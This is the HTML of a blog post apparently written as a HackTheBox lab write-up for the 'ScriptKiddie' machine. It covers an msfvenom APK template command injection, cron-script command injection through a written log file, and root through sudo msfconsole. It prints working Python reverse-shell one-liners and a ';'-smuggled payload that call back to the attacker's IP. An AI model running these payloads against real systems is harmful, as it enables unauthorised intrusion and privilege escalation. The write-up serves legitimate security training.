@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Hackthebox - Script_kiddie - Write up // Itarow</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Itarow" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://itarow.github.io/css/main.min.93a6fb3f59f8b73cc421a59ee5368eba507d50e7ffacf0723c82b2d680307f27.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox - Script_kiddie - Write up"/>
+<meta name="twitter:description" content="So I rooted Script-Kiddie from HackTheBox, which was an easy Linux box. This box was create by 0xdf, thanks to him. It includes a CVE on msfvenom for Foothold, a crontab exploit for the lateral movement and a sudo authorization on metasploit for root part.
+Foothold First we start with a classic nmap scan :
+$ nmap -A -p- -T4 10.10.10.226 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0."/>
+
+    <meta property="og:title" content="Hackthebox - Script_kiddie - Write up" />
+<meta property="og:description" content="So I rooted Script-Kiddie from HackTheBox, which was an easy Linux box. This box was create by 0xdf, thanks to him. It includes a CVE on msfvenom for Foothold, a crontab exploit for the lateral movement and a sudo authorization on metasploit for root part.
+Foothold First we start with a classic nmap scan :
+$ nmap -A -p- -T4 10.10.10.226 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itarow.github.io/posts/hackthebox-script_kiddie/" />
+<meta property="article:published_time" content="2021-06-12T16:07:51+02:00" />
+<meta property="article:modified_time" content="2021-06-12T16:07:51+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://itarow.github.io"><img class="app-header-avatar" src="/avatar.jpg" alt="Itarow" /></a>
+      <h1>Itarow</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/home/Itarow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags">/tags</a>
+      </nav>
+      <p>CS student, wrtiting some write up of cool CTF&#39;s challenges and box</p>
+      <div class="app-header-social">
+        
+          <a href="https://www.root-me.org/Itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-flag">
+  <title>Root-me</title>
+  <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/0xItarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/409940" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-terminal">
+  <title>HackTheBox</title>
+  <polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Hackthebox - Script_kiddie - Write up</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 12, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://itarow.github.io/tags/hackthebox/">HackTheBox</a>
+              <a class="tag" href="https://itarow.github.io/tags/write-up/">Write-up</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>So I rooted Script-Kiddie from HackTheBox, which was an easy Linux box. This box was create by 0xdf, thanks to him. It includes a CVE on msfvenom for Foothold, a crontab exploit for the lateral movement and a sudo authorization on metasploit for root part.</p>
+<h2 id="foothold">Foothold</h2>
+<p>First we start with a classic nmap scan :</p>
+<pre><code>$ nmap -A -p- -T4 10.10.10.226
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d 5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>So we have a website on port 5000, we decide to go in.</p>
+<p><img src="../img/scriptKid/img1.png" alt=""></p>
+<p>We could see 3 tools, nmap, msfvenom/meterpreter, and searchsploit.</p>
+<p>First, I tried to do multiple way of command injection on each field but unfortunately, it doesn’t work. So after a few enumerations with gobuster, I diced to try nikto which found a MIME vulnerability. It says that we could upload the type file that we want on the template option.</p>
+<p>So I tried to upload PHP page, to get RCE (Remote Command Execution). The problem is that is couldn’t trigger the file that I uploaded, I could only download it …</p>
+<p>I continued my search on this optional template file that we could upload.</p>
+<p>I found a CVE(<a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a>) on exploit DB, which allow command injection on the server with msfvenom and APK template. The CVE includes a metasploit module which create the evil file with reverse shell parameter (our IP and the port where we listen).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf6 exploit<span style="color:#f92672">(</span>unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection<span style="color:#f92672">)</span> &gt; options
+
+Module options <span style="color:#f92672">(</span>exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection<span style="color:#f92672">)</span>:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+
+
+Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.15.32      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+   **DisablePayloadHandler: True   <span style="color:#f92672">(</span>no handler will be created!<span style="color:#f92672">)</span>**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">0</span>   Automatic
+
+
+msf6 exploit<span style="color:#f92672">(</span>unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> msf.apk stored at /home/art/.msf4/local/msf.apk
+</code></pre></div><p>So after, we just have to select the malicious template file, put a random IP, select Android (parameter which allow uploading apk template) open a netcat session on port 4444 and generate the meterpreter session.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -lvnp <span style="color:#ae81ff">4444</span>                  
+Connection from 10.10.10.226:33818
+id &amp; whoami
+kid
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="lateral-movement">Lateral movement</h2>
+<p>So now, we searched to gain pwn user access (the user between us and root).
+After a few enumerations with linpeas, I found an interesting file in pwn home folder called scanlosers.sh.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+log<span style="color:#f92672">=</span>/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u | <span style="color:#66d9ef">while</span> read ip; <span style="color:#66d9ef">do</span>
+    sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">.nmap </span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
+<span style="color:#66d9ef">done</span>
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>wc -l &lt; $log<span style="color:#66d9ef">)</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo -n &gt; $log; <span style="color:#66d9ef">fi</span>
+</code></pre></div><p>In the content of the script, we could see that the script is going to search in our home folder, the content of /logs/hackers of which we have the rights to write on it.</p>
+<p>We can ask ourselves, how the script is executed because in the enumeration phase, we don’t found a particular crontab on this script. To check if the script execute by a cron that we couldn’t see with simple enumeration, we just put a random word on /logs/hackers, and instantly after this modification, when we read the file, It is empty. So now we are sure that this script is executed by a cron of another user than us (enumeration proved it :p ).</p>
+<h3 id="exploitation-of-the-script">Exploitation of the script</h3>
+<p>The tips here, is to reproduce the environment of the script locally, it allows neglecting nothing. So the script is going to read the /logs/hackers file that we could write on it, It performs a cut command and realize an nmap command with the recover part.</p>
+<p>It cut all the part before the second space of the line. We know it’s a bash script, so we could use the “;” separator which allow executing another command. This command is going to be executed as the crontab user, so we could put a reverse shell command to get a shell on him é_é.</p>
+<p>So we have to put 2 a and 2 space, a “;” and our reverse shell payload in python.</p>
+<p>I tried locally, It works, so we just have to do the same on the machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ echo <span style="color:#e6db74">&#34;a a ;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;</span>10.10.15.32<span style="color:#e6db74">&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;</span>/bin/sh<span style="color:#e6db74">&#34;,&#34;</span>-i<span style="color:#e6db74">&#34;]);&#39;&#34;</span> &gt; hackers
+
+///////<span style="color:#ae81ff">\\\\\\\
+</span><span style="color:#ae81ff"></span><span style="color:#75715e"># we open a netcat session on port 4444</span>
+
+$ nc -lvnp <span style="color:#ae81ff">4444</span>
+Connection from 10.10.10.226:36024
+$ whoami
+pwn
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>So last part, we move into root user ^^.
+We start a little linpeas script, and we found something fascinating :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking <span style="color:#e6db74">&#39;sudo -l&#39;</span>, /etc/sudoers, and /etc/sudoers.d
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries <span style="color:#66d9ef">for</span> pwn on scriptkiddie:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre></div><p>We could execute msfconsole with root right :o</p>
+<pre><code>$ sudo msfconsole
+$ whoami
+root
+$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.32&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+
+/////\\\\\
+# we open a netcat session on port 4444
+
+$ nc -lvnp 4444
+Connection from 10.10.10.226:36024
+/bin/sh: 0: can't access tty; job control turned off
+# whoami &amp; id
+uid=0(root) gid=0(root) groups=0(root)
+# root
+</code></pre><p>And BOOM! We are root é_é.
+Thank you for your reading and see you later for a new one :)</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
